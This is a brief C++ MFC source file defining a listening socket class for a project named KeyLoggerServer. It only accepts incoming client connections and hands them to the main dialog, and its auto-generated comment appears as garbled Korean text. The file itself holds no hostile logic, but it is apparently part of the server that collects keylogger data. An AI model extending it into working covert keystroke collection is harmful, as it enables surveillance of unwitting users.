#include "pch.h"
#include "CListenSocket.h"
#include "KeyLoggerServerDlg.h"

CListenSocket::CListenSocket(CKeyLoggerServerDlg* dlg)
{
	m_mainDlg = dlg;
}
void CListenSocket::OnAccept(int nErrorCode)
{
	// TODO: ���⿡ Ư��ȭ�� �ڵ带 �߰� ��/�Ǵ� �⺻ Ŭ������ ȣ���մϴ�.
	m_mainDlg->ClientAccept();
	CSocket::OnAccept(nErrorCode);
}
